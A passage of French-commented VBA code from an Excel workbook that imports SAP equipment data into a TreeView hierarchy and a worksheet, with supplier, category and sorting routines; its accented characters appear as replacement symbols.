                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, Mfp, "Fp " & Fp & ", " & dbText, "FP" ', "Image1", "Image2"
                            Else
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, Mfp, "Fp " & Fp & ", " & convertString(dbText, 1251), "FP" ', "Image1", "Image2"
                            End If
                            'TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, Mfp, "Fp " & Fp & ", " & VBA.Trim(adoRecordset.Fields("DES_FP").Value), "FP" ', "Image1", "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Tag = Fp
                        End If
                    
                ElseIf sChaine = "SFP" Then
                        If Sfp <> VBA.Trim(.Fields("SFP").Value) And VBA.Trim(.Fields("SFP").Value) <> vbNullString Then
                            Op = vbNullString 'On peut avoir des OP identiques dans des SFP diff|fffd|rents
                            Sfp = VBA.Trim(.Fields("SFP").Value)
                            MSfp = "S_" & Sfp & "_" & Index 'M|fffd|morise la Branche
                            Pt_Pose = Calcul_Point_Pose(adoRecordset, "SFP", Division, Metier, MLigne, MEfp, Mfp, MSfp, MOp)
                            If IsNull(adoRecordset.Fields("DES_SFP").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_SFP").Value)
                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MSfp, "Sfp " & Sfp & ", " & dbText, "SFP" ', "Image1", "Image2"
                            Else
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MSfp, "Sfp " & Sfp & ", " & convertString(dbText, 1251), "SFP" ', "Image1", "Image2"
                            End If
                            'TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MSfp, "Sfp " & Sfp & ", " & VBA.Trim(adoRecordset.Fields("DES_SFP").Value), "SFP" ', "Image1", "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Tag = Sfp
                        End If
                    
                ElseIf sChaine = "OP" Then
                        If Op <> VBA.Trim(.Fields("OP").Value) And VBA.Trim(.Fields("OP").Value) <> vbNullString Then
                            Op = VBA.Trim(.Fields("OP").Value)
                            MOp = "O_" & Op & "_" & Index 'M|fffd|morise la Branche
                            Pt_Pose = Calcul_Point_Pose(adoRecordset, "OP", Division, Metier, MLigne, MEfp, Mfp, MSfp, MOp)
                            If IsNull(.Fields("DES_OP").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_OP").Value)
                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MOp, "Op " & Op & ", " & dbText, "OP" ', "Image1", "Image2"
                            Else
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MOp, "Op " & Op & ", " & convertString(dbText, 1251), "OP" ', "Image1", "Image2"
                            End If
                            'TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MOp, "Op " & Op & ", " & VBA.Trim(adoRecordset.Fields("DES_OP").Value), "OP" ', "Image1", "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Tag = Op
                        End If
                    
                ElseIf sChaine = "ID_EQT" Then   'Equipement
                        If Eqt <> VBA.Trim(.Fields("ID_EQT").Value) And VBA.Trim(.Fields("ID_EQT").Value) <> vbNullString Then
                            Eqt = VBA.Trim(.Fields("ID_EQT").Value)
                            MEqt = "Q_" & Eqt & "_" & Index 'M|fffd|morise la Branche
                            Pt_Pose = Calcul_Point_Pose(adoRecordset, "ID_EQT", Division, Metier, MLigne, MEfp, Mfp, MSfp, MOp)
                            If IsNull(.Fields("DES_EQT").Value) Then dbText = vbNullString Else dbText = VBA.Trim(.Fields("DES_EQT").Value)
                            If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MEqt, "Equipement " & Eqt & ", " & dbText, "Equip" ', "Image2"
                            Else
                                TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MEqt, "Equipement " & Eqt & ", " & convertString(dbText, 1251), "Equip" ', "Image2"
                            End If
                            
                            'TreeView.Nodes.FullPath
                            'TreeView.Nodes.Add Pt_Pose, MSComctlLib.tvwChild, MEqt, "Equipement " & Eqt & ", " & VBA.Trim(adoRecordset.Fields("DES_EQT").Value), "Equip" ', "Image2"
                            TreeView.Nodes.Item(TreeView.Nodes.Count).Tag = Eqt
                        End If
                    
'                ElseIf sChaine = "NIV" Then
'                ElseIf sChaine = "NOM_FOUR" Then
'                ElseIf sChaine = "REF_FOUR" Then
'                ElseIf sChaine = "NOM_INT" Then
'                ElseIf sChaine = "REF_INT" Then'
'                Else
'                        'Stop
                End If
            Next
            ' Enregistrement suivant
            .MoveNext
        Loop
    End With
    Application.EnableEvents = True
End Sub


Function Calcul_Point_Pose(adoRecordset As ADODB.Recordset, Niveau As String, Division As String, Metier As String, MLigne As String, MEfp As String, Mfp As String, MSfp As String, MOp As String)
    'Calcul du point de pose de l'|fffd|quipement dans le Treeview
    If Niveau = "DIV_PT" Then 'Racine
            Calcul_Point_Pose = vbNullString
            
    ElseIf Niveau = "MET" Then
            Calcul_Point_Pose = Division
            
    ElseIf Niveau = "LIG" Then
            Calcul_Point_Pose = Metier
            If IsNull(VBA.Trim(adoRecordset.Fields("MET").Value)) Or (VBA.Trim(adoRecordset.Fields("MET").Value) = vbNullString) Then Calcul_Point_Pose = Division
  
    ElseIf Niveau = "EFP" Then
            Calcul_Point_Pose = MLigne
            If IsNull(VBA.Trim(adoRecordset.Fields("LIG").Value)) Or (VBA.Trim(adoRecordset.Fields("LIG").Value) = vbNullString) Then
                Calcul_Point_Pose = Metier
                If IsNull(VBA.Trim(adoRecordset.Fields("MET").Value)) Or (VBA.Trim(adoRecordset.Fields("MET").Value) = vbNullString) Then Calcul_Point_Pose = Division
            End If

    ElseIf Niveau = "FP" Then
            Calcul_Point_Pose = MEfp
            If VBA.Trim(adoRecordset.Fields("EFP").Value) = vbNullString Then
                Calcul_Point_Pose = MLigne
                If VBA.Trim(adoRecordset.Fields("LIG").Value) = vbNullString Then
                    Calcul_Point_Pose = Metier
                    If VBA.Trim(adoRecordset.Fields("MET").Value) = vbNullString Then Calcul_Point_Pose = Division
                End If
            End If
        
    ElseIf Niveau = "SFP" Then
            Calcul_Point_Pose = Mfp
            If IsNull(VBA.Trim(adoRecordset.Fields("FP").Value)) Or (VBA.Trim(adoRecordset.Fields("FP").Value) = vbNullString) Then
                Calcul_Point_Pose = MEfp
                If IsNull(VBA.Trim(adoRecordset.Fields("EFP").Value)) Or (VBA.Trim(adoRecordset.Fields("EFP").Value) = vbNullString) Then
                    Calcul_Point_Pose = MLigne
                    If IsNull(VBA.Trim(adoRecordset.Fields("LIG").Value) = vbNullString) Or (VBA.Trim(adoRecordset.Fields("LIG").Value) = vbNullString) Then
                        Calcul_Point_Pose = Metier
                        If IsNull(VBA.Trim(adoRecordset.Fields("MET").Value)) Or (VBA.Trim(adoRecordset.Fields("MET").Value) = vbNullString) Then Calcul_Point_Pose = Division
                    End If
                End If
            End If
        
    ElseIf Niveau = "OP" Then
            Calcul_Point_Pose = MSfp
            If IsNull(VBA.Trim(adoRecordset.Fields("SFP").Value)) Or (VBA.Trim(adoRecordset.Fields("SFP").Value) = vbNullString) Then
                Calcul_Point_Pose = Mfp
                If IsNull(VBA.Trim(adoRecordset.Fields("FP").Value)) Or (VBA.Trim(adoRecordset.Fields("FP").Value)) = vbNullString Then
                    Calcul_Point_Pose = MEfp
                    If IsNull(VBA.Trim(adoRecordset.Fields("EFP").Value)) Or (VBA.Trim(adoRecordset.Fields("EFP").Value) = vbNullString) Then
                        Calcul_Point_Pose = MLigne
                        If IsNull(VBA.Trim(adoRecordset.Fields("LIG").Value)) Or (VBA.Trim(adoRecordset.Fields("LIG").Value) = vbNullString) Then
                            Calcul_Point_Pose = Metier
                            If IsNull(VBA.Trim(adoRecordset.Fields("MET").Value)) Or (VBA.Trim(adoRecordset.Fields("MET").Value) = vbNullString) Then Calcul_Point_Pose = Division
                        End If
                    End If
                End If
            End If
        
    ElseIf Niveau = "ID_EQT" Then  'Equipement
            Calcul_Point_Pose = MOp
            If IsNull(VBA.Trim(adoRecordset.Fields("OP").Value)) Or (VBA.Trim(adoRecordset.Fields("OP").Value) = vbNullString) Then
                Calcul_Point_Pose = MSfp
                If IsNull(VBA.Trim(adoRecordset.Fields("SFP").Value)) Or (VBA.Trim(adoRecordset.Fields("SFP").Value) = vbNullString) Then
                    Calcul_Point_Pose = Mfp
                    If IsNull(VBA.Trim(adoRecordset.Fields("FP").Value)) Or (VBA.Trim(adoRecordset.Fields("FP").Value) = vbNullString) Then
                        Calcul_Point_Pose = MEfp
                        If IsNull(VBA.Trim(adoRecordset.Fields("EFP").Value)) Or (VBA.Trim(adoRecordset.Fields("EFP").Value) = vbNullString) Then
                            Calcul_Point_Pose = MLigne
                            If IsNull(VBA.Trim(adoRecordset.Fields("LIG").Value)) Or (VBA.Trim(adoRecordset.Fields("LIG").Value) = vbNullString) Then
                                Calcul_Point_Pose = Metier
                                If IsNull(VBA.Trim(adoRecordset.Fields("MET").Value)) Or (VBA.Trim(adoRecordset.Fields("MET").Value) = vbNullString) Then Calcul_Point_Pose = Division
                            End If
                        End If
                    End If
                End If
            End If
    End If
    
End Function


Sub Import_SAP(adoRecordset As ADODB.Recordset, shResult As String, Equipements As String)
    Dim MsgInfo As String
    
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportOnglet")
    DoEvents
    
    If shResult = shDecoupage Then
            frmProgression.UpdateProgress 2 / 9, MsgInfo & " : " & shDecoupage, frmProgression.FlagAbandon
            Equipements_A_Retenir adoRecordset, Equipements
            Import_Decoupage adoRecordset, Equipements
    ElseIf shResult = shMateriels Then
            frmProgression.UpdateProgress 4 / 9, MsgInfo & " : " & shMateriels, frmProgression.FlagAbandon
            Import_Materiels adoRecordset
    ElseIf shResult = "Doc_Materiels" Then
            frmProgression.UpdateProgress 6 / 9, MsgInfo & " : Documents / Materiels", frmProgression.FlagAbandon
            Import_Documents_Materiels adoRecordset
    ElseIf shResult = shDocuments Then
            frmProgression.UpdateProgress 8 / 9, MsgInfo & " : " & shDocuments, frmProgression.FlagAbandon
            Import_Documents_Equipements adoRecordset
    Else
            'Stop
    End If
End Sub


Sub Equipements_A_Retenir(adoRecordset As ADODB.Recordset, ByRef Equipements As String)
    'Afin d'optimiser les temps de traitement de l'onglet D|fffd|coupage
    Dim Eqt As String, Eqt_Sup As String, sChaine As String
    Dim Change  As Boolean
    Application.EnableEvents = False
    
    'Marquage des |fffd|quipements |fffd| prendre en compte dans le Recordset
    With adoRecordset
        Change = False
        Do While Not (.EOF)
            'Est-ce que l'|fffd|quipement est rattach|fffd| |fffd| un |fffd|quipement sup|fffd|rieur s|fffd|lectionn|fffd|
            sChaine = .Fields("EQT_SUP").Value
            If IsNull(sChaine) Then
                Eqt_Sup = vbNullString
            Else
                Eqt_Sup = VBA.Trim(sChaine)
            End If
            '
            sChaine = "'" & Eqt_Sup & "'"
            If VBA.InStr(Equipements, sChaine) <> 0 Then 'Dans la liste des |fffd|quipements s|fffd|lectionn|fffd|s
                Eqt = VBA.Trim(adoRecordset.Fields("ID_EQT").Value)
                sChaine = "'" & Eqt & "'"
                If VBA.InStr(Equipements, sChaine) = 0 Then 'Pas d|fffd|j|fffd| enregistr|fffd|
                    If Equipements <> vbNullString Then Equipements = Equipements & ", "
                        Equipements = Equipements & sChaine
                        Change = True
                End If
            End If
            ' On passe |fffd| l'enregistrement suivant
            .MoveNext
        Loop
    End With
            
    If Change Then Equipements_A_Retenir adoRecordset, Equipements 'It|fffd|ration

    Application.EnableEvents = True
End Sub


Sub Import_Decoupage(adoRecordset As ADODB.Recordset, Equipements As String)
    Dim wsDec As Worksheet
    Dim LigneDec As Long
    Dim iColIndex As Integer, Pos As Integer
    Dim Nom_Four As String, Ref_Four As String, Num As String, Niveau As String
    Dim sChaine As Variant
    
    Application.EnableEvents = False
    
    Set wsDec = ThisWorkbook.Worksheets(shDecoupage)
    LigneDec = FirstLine(shDecoupage) 'SheetCls.LastLineColumn(wsDec, wsDec.Range("DecNumeroOrdre").Column) + 1
    With adoRecordset
        .MoveFirst
        Do While Not (.EOF)
            'Est-ce que l'|fffd|quipement est |fffd| prendre en compte
            Num = VBA.Trim(.Fields("ID_EQT").Value)
            If VBA.InStr(Equipements, "'" & Num & "'") <> 0 Then 'Dans la liste des |fffd|quipements s|fffd|lectionn|fffd|s
                wsDec.Cells(LigneDec, wsDec.Range("DecNumeroOrdre").Column).Formula = LigneDec
                For iColIndex = 0 To .Fields.Count - 1
                    sChaine = .Fields(iColIndex).Value
                    If .Fields(iColIndex).Name = "DIV_PT" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecDivision").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecDivision").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "DES_DIV" Then
                    
                    ElseIf .Fields(iColIndex).Name = "MET" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecMetier").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecMetier").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "DES_MET" Then
                    
                    ElseIf .Fields(iColIndex).Name = "LIG" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecLigne").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecLigne").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "DES_LIG" Then
                    
                    ElseIf .Fields(iColIndex).Name = "EFP" Then
                            If IsNull(sChaine) Or (VBA.Trim(sChaine) = vbNullString) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecEfp").Column).Formula = "---"
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecEfp").Column).Formula = VBA.Trim(sChaine)
                            End If
                            
                    ElseIf .Fields(iColIndex).Name = "DES_EFP" Then
                    
                    ElseIf .Fields(iColIndex).Name = "FP" Then
                            If IsNull(sChaine) Or (VBA.Trim(sChaine) = vbNullString) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecFp").Column).Formula = "----"
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecFp").Column).Formula = VBA.Trim(sChaine)
                            End If
                            
                    ElseIf .Fields(iColIndex).Name = "DES_FP" Then
                    
                    ElseIf .Fields(iColIndex).Name = "SFP" Then
                            If IsNull(sChaine) Or (VBA.Trim(sChaine) = vbNullString) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecSfp").Column).Formula = "----"
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecSfp").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "DES_SFP" Then
                    
                    ElseIf .Fields(iColIndex).Name = "OP" Then
                            If IsNull(sChaine) Or (VBA.Trim(sChaine) = vbNullString) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecOp").Column).Formula = "----"
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecOp").Column).Formula = VBA.Trim(sChaine)
                            End If
                            
                    ElseIf .Fields(iColIndex).Name = "DES_OP" Then
                            Designation_Operation_Process wsDec, LigneDec, adoRecordset
                        
                        '|fffd|lot (Automate) ? pas dans Sap
                        'Zone ? pas dans Sap
                        
                    ElseIf .Fields(iColIndex).Name = "ZONE_TRI" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecRepere").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecRepere").Column).Formula = VBA.Trim(sChaine)
                            End If
                        
                        'PMP (O/N) ? pas dans Sap
                        
                    ElseIf .Fields(iColIndex).Name = "ID_EQT" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecNoSimon").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecNoSimon").Column).Formula = VBA.Trim(sChaine)
                            End If
                        'Mn|fffd|mo SMP ? pas dans Sap
    
                    ElseIf .Fields(iColIndex).Name = "NIV" Then
                            'Niveau de Pose 0=GE, 1=E, 2=S ou 1=S
                            If IsNull(sChaine) Then
                                Niveau = vbNullString
                            Else
                                Niveau = VBA.Trim(sChaine)
                            End If
                            If Niveau = "S/E" Then Niveau = "S"
                            wsDec.Cells(LigneDec, wsDec.Range("DecNiveau").Column).Formula = Niveau
                            
                    ElseIf .Fields(iColIndex).Name = "EQT_SUP" Then
                            If IsNull(sChaine) Or (VBA.Trim(sChaine) = vbNullString) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecPmp").Column).Formula = VBA.Trim(.Fields("ID_EQT").Value)
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecPmp").Column).Formula = VBA.Trim(sChaine)
                            End If
                            
                    ElseIf .Fields(iColIndex).Name = "DT_MODIF" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecDateModif").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecDateModif").Column).Formula = FormatDateTime(VBA.Trim(sChaine), vbShortDate)
                            End If
                        
                    ElseIf .Fields(iColIndex).Name = "CTG_S" Then
                            If IsNull(VBA.Trim(.Fields("NOM_FOUR").Value)) Then
                                Nom_Four = vbNullString
                            Else
                                Nom_Four = VBA.Trim(.Fields("NOM_FOUR").Value)
                            End If
                            If IsNull(VBA.Trim(.Fields("REF_FOUR").Value)) Then
                                Ref_Four = vbNullString
                            Else
                                Ref_Four = VBA.Trim(.Fields("REF_FOUR").Value)
                            End If
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecCategorie").Column).Formula = Traitement_Categorie(vbNullString, Nom_Four, Ref_Four)
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecCategorie").Column).Formula = Traitement_Categorie(VBA.Trim(sChaine), Nom_Four, Ref_Four)
                            End If
                            
                            'Nomenclature
                            wsDec.Cells(LigneDec, wsDec.Range("DecNomencl").Column).Formula = "N" 'Aucune Fourniture par d|fffd|faut
                        
                    ElseIf .Fields(iColIndex).Name = "REF_FOUR" Then
                            If IsNull(sChaine) Then
                                Ref_Four = vbNullString
                            Else
                                Ref_Four = VBA.Trim(sChaine)
                            End If
                            Ctrl_Info_Fournisseur Ref_Four, .Fields("ID_EQT").Value, wsDec.Cells(LigneDec, wsDec.Range("DecNum_SSEN").Column)
                            
                    ElseIf .Fields(iColIndex).Name = "NOM_FOUR" Then
                            If IsNull(sChaine) Then
                                Nom_Four = vbNullString
                            Else
                                Nom_Four = VBA.Trim(sChaine)
                            End If
                            Ctrl_Info_Fournisseur Nom_Four, .Fields("ID_EQT").Value, wsDec.Cells(LigneDec, wsDec.Range("DecNomFournisseur").Column)
    
                    ElseIf .Fields(iColIndex).Name = "DES_MAT" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecDesignation").Column).Formula = vbNullString
                            Else
                                If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                    wsDec.Cells(LigneDec, wsDec.Range("DecDesignation").Column).Formula = VBA.Trim(sChaine)
                                Else
                                    wsDec.Cells(LigneDec, wsDec.Range("DecDesignation").Column).Formula = ReplaceCharacterCyrillic(VBA.Trim(sChaine))
                                End If
                            End If
                        
                    ElseIf .Fields(iColIndex).Name = "NUM_IMMO" Then
                            If IsNull(sChaine) Then
                                Num = vbNullString
                            Else
                                Num = VBA.Trim(sChaine)
                            End If
                            Pos = VBA.InStr(Num, ".")
                            If Pos <> 0 Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecNoImmoPr").Column).Formula = VBA.Mid(Num, 1, Pos - 1)
                                wsDec.Cells(LigneDec, wsDec.Range("DecNoImmoSub").Column).Formula = VBA.Mid(Num, Pos + 1, VBA.Len(Num))
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecNoImmoPr").Column).Formula = Num
                            End If
                        
                        'Etat Process Pas dans Sap
                        'Date du Jalon ATFMR Pas dans Sap
                        
                    ElseIf .Fields(iColIndex).Name = "REF_INT" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecRefIntegrateur").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecRefIntegrateur").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "NOM_INT" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecNomIntegrateur").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecNomIntegrateur").Column).Formula = VBA.Trim(sChaine)
                            End If
                        'Code EAN Pas dans Sap
                        
                    ElseIf .Fields(iColIndex).Name = "QTE" Then
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecQuantite").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecQuantite").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "CD_ART" Then  'Sacim Mabec
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecSacimMabec").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecSacimMabec").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "MAINT_EQT" Then  'A Maintenir
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecAMaintenir").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecAMaintenir").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "LICENCE" Then  'N|fffd| Licence A Importer
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecNoLicence").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecNoLicence").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "COD_FAM" Then  'Code Famille A Importer
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecCodeFamille").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecCodeFamille").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "CTG" Then  'Cat|fffd|gorie Simon A Importer
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecCatSimon").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecCatSimon").Column).Formula = VBA.Trim(sChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "DES_EQT" Then  'Libell|fffd| Fonctionnel
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecLibMatricule").Column).Formula = vbNullString
                            Else
                                If ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value <> "RU" Then
                                    wsDec.Cells(LigneDec, wsDec.Range("DecLibMatricule").Column).Formula = VBA.Trim(sChaine)
                                Else
                                    wsDec.Cells(LigneDec, wsDec.Range("DecLibMatricule").Column).Formula = ReplaceCharacterCyrillic(VBA.Trim(sChaine))
                                End If
                            End If
                    ElseIf .Fields(iColIndex).Name = "MAT" Then  'Matricule
                            If IsNull(sChaine) Then
                                wsDec.Cells(LigneDec, wsDec.Range("DecMatricule").Column).Formula = vbNullString
                            Else
                                wsDec.Cells(LigneDec, wsDec.Range("DecMatricule").Column).Formula = VBA.Trim(sChaine)
                            End If
                        
                        'Observation Pas dans Sap
                        'Note Pas dans Sap
                        'Pi|fffd|ce de Rechange Pas dans Sap
    
                       ' Case "DOC" 'Document A Importer
                            wsDec.Cells(LigneDec, wsDec.Range("DecDocument").Column).Formula = "SP" 'VBA.Trim(adoRecordset.Fields(iColIndex).Value)
    
                        'Technologie Pas dans Sap pour Equipement
                        'Remarques Pas dans Sap
                        
                    Else
                            Stop 'il manque quelque chose
                    End If
                Next iColIndex
                
                Test_Limite_Excel wsDec, LigneDec
                LigneDec = LigneDec + 1
            Else
                'Stop
            End If
            
            ' On passe au suivant
            .MoveNext
        Loop
    End With
                
    Niveau_Pose wsDec
        
    'Trier Decoupage sur arborescence Mat|fffd|riel Sup|fffd|rieur et Niveau
    LigneDec = FirstLine(shDecoupage) 'DecPmp
    wsDec.Rows(LigneDec & ":" & Lastline(wsDec)).Sort _
        Key1:=wsDec.Cells(LigneDec, wsDec.Range("DecOrdreTri").Column), Order1:=xlAscending, _
        Key2:=wsDec.Cells(LigneDec, wsDec.Range("DecNiveauPose").Column), Order2:=xlAscending, _
        Header:=xlNo, OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal, DataOption2:=xlSortNormal

        'DataOption1:=xlSortTextAsNumbers, DataOption2:=xlSortTextAsNumbers
        
    Deplacer_Ensembles_Niveau_0 wsDec

    Application.EnableEvents = True
End Sub


Sub Test_Limite_Excel(wsDec As Worksheet, LigneDec As Long)
    If LigneDec >= wsDec.Rows.Count Then
        MsgCls.ShowMessage "MsgLimiteExcel", vbCrLf + vbCrLf, "MsgCancel", vbNullString, vbOKOnly + vbCritical
        End
    End If
End Sub


Function Serie_Etoiles(ByVal Ref As String) As Boolean
    'Enlever les |fffd|toiles et Ref non vide
    Ref = VBA.Trim(VBA.Replace(Ref, "*", vbNullString))
    If Ref = vbNullString Then Serie_Etoiles = True Else Serie_Etoiles = False
End Function


Sub Ctrl_Info_Fournisseur(Ref As String, No_Simon As String, Rng As Range)
    'Si non document|fffd|e, la valeur "SAP" est mise par d|fffd|faut voir Manuel BAO.doc Page 23
    If Serie_Etoiles(Ref) Then Ref = "SAP" & VBA.Trim(No_Simon)
    
    If VBA.Left(Ref, 3) = "SAP" And Rng = vbNullString Then
        Rng = Ref 'Ecriture de SAP
    ElseIf Ref <> vbNullString And (Rng = vbNullString Or VBA.Left(Rng, 3) = "SAP") Then
        Rng = Ref 'Ecriture de la Ref
    End If
End Sub


Function Traitement_Categorie(Categorie As String, Nom_Four As String, Ref_Four As String) As String
    If Categorie = vbNullString Then
        Categorie = "F"
        If Nom_Four = "RENAULT" And VBA.Mid(Ref_Four, 1, 1) = "E" Then Categorie = "B"
        If Nom_Four = "RENAULT" And VBA.Mid(Ref_Four, 1, 1) = "D" Then Categorie = "B"
        If Nom_Four = "RENAULT" And VBA.Mid(Ref_Four, 1, 1) = "R" Then Categorie = "R"
        If Serie_Etoiles(Nom_Four) And VBA.Mid(Ref_Four, 1, 1) = "*" Then Categorie = "B"
    End If
    Traitement_Categorie = Categorie
End Function


Sub Designation_Operation_Process(wsDec As Worksheet, LigneDec As Long, adoRecordset As ADODB.Recordset)
    Dim Design As String
    With adoRecordset
        If Not (IsNull(VBA.Trim(.Fields("OP").Value))) And (VBA.Trim(.Fields("OP").Value) <> vbNullString) Then
            If IsNull(VBA.Trim(.Fields("DES_OP").Value)) Then Design = vbNullString Else Design = VBA.Trim(.Fields("DES_OP").Value)
        ElseIf Not (IsNull(VBA.Trim(.Fields("SFP").Value))) And (VBA.Trim(.Fields("SFP").Value) <> vbNullString) Then
            If IsNull(VBA.Trim(.Fields("DES_SFP").Value)) Then Design = vbNullString Else Design = VBA.Trim(.Fields("DES_SFP").Value)
        ElseIf Not (IsNull(VBA.Trim(.Fields("FP").Value))) And (VBA.Trim(.Fields("FP").Value) <> vbNullString) Then
            If IsNull(VBA.Trim(.Fields("DES_FP").Value)) Then Design = vbNullString Else Design = VBA.Trim(.Fields("DES_FP").Value)
        ElseIf Not (IsNull(VBA.Trim(.Fields("EFP").Value) <> vbNullString)) And (VBA.Trim(.Fields("EFP").Value) <> vbNullString) Then
            If IsNull(VBA.Trim(.Fields("DES_EFP").Value)) Then Design = vbNullString Else Design = VBA.Trim(.Fields("DES_EFP").Value)
        End If
    End With
    wsDec.Cells(LigneDec, wsDec.Range("DecLibProcess").Column).Formula = Design
End Sub


Sub Niveau_Pose(wsDec As Worksheet)
    'Niveau de Pose 0=GE, 1=E, 2=S ou 1=S
    Dim Ligne    As Long
    Dim Niv_Pose As String
    Dim No_Simon As String
    Dim Rech     As Object
    Dim Change   As Boolean
    
    Application.EnableEvents = False
    
    With wsDec
        Change = True
        Do While Change 'Tant que l'on trouve des P|fffd|res
            Change = False
            For Ligne = FirstLine(shDecoupage) To Lastline(wsDec)
                Niv_Pose = .Cells(Ligne, .Range("DecNiveauPose").Column).Value
                If Niv_Pose = vbNullString Then
                    No_Simon = .Cells(Ligne, .Range("DecPmp").Column).Value
                    'Recherche du Pere
                    Set Rech = .Columns(.Range("DecNoSimon").Column).Find(what:=No_Simon, LookAt:=xlWhole)
                    If Not Rech Is Nothing Then
                        If Ligne = Rech.row Then
                            'Pere & Fils m|fffd|me Num|fffd|ro, Pos|fffd| sur le Poste Technique
                            .Cells(Ligne, .Range("DecNiveauPose").Column).Value = 0
                            .Cells(Ligne, .Range("DecOrdreTri").Column).Value = .Cells(Ligne, .Range("DecPmp").Column).Value
                            Change = True
